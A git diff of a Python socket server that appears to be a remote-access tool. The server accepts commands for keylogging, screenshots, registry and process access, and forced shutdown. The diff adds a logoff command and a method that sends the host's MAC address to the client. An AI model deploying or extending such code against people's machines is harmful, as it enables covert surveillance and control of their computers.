@@ -1,6 +1,7 @@
 import os
 import socket
 import tkinter as tk
+from uuid import getnode as get_mac
 from threading import Thread
 from src.screenshot import Screenshot
 from src.process import Process
@@ -71,6 +72,8 @@ class Server:
                 self.process()
             elif cmd == 'application':
                 self.application()
+            elif cmd == 'logoff':
+                self.logoff()
             elif cmd == 'quit':
                 break
                 
@@ -84,32 +87,11 @@ class Server:
         if self.server:
             self.server.close() 
 
-    def handle_client(self):
-        try:
-            while True:
-                cmd = self.client.recv(32).decode('utf8')
-                if cmd == 'keystroke':
-                    self.keystroke()
-                elif cmd == 'shutdown':
-                    self.shutdown()
-                elif cmd == 'registry':
-                    self.registry()
-                elif cmd == 'screenshot':
-                    self.screenshot()
-                elif cmd == 'process':
-                    self.process()
-                elif cmd == 'application':
-                    self.application()
-                elif cmd == 'quit':
-                    break
-        except:
-            pass
-
     def keystroke(self):
         doit = KeyLogger(self.client)
         doit.run()
         pass
-
+    
     def shutdown(self):
         os.popen("shutdown -s")
         pass
@@ -132,6 +114,20 @@ class Server:
     def application(self):
         doit = Application(self.client)
         doit.run()
+        pass
+    
+    """------------- new features -----------"""
+
+    def logoff(self):
+        os.popen("shutdown -l")
+        pass
+    
+    def get_MAC_address(self):
+        mac = []
+        for bit in range(0, 8 * 6, 8):
+            mac.append('{:02x}'.format((get_mac() >> bit) & 0xff))
+        mac = ':'.join(mac[::-1])
+        self.client.sendall(bytes(mac))
         pass
 
     pass
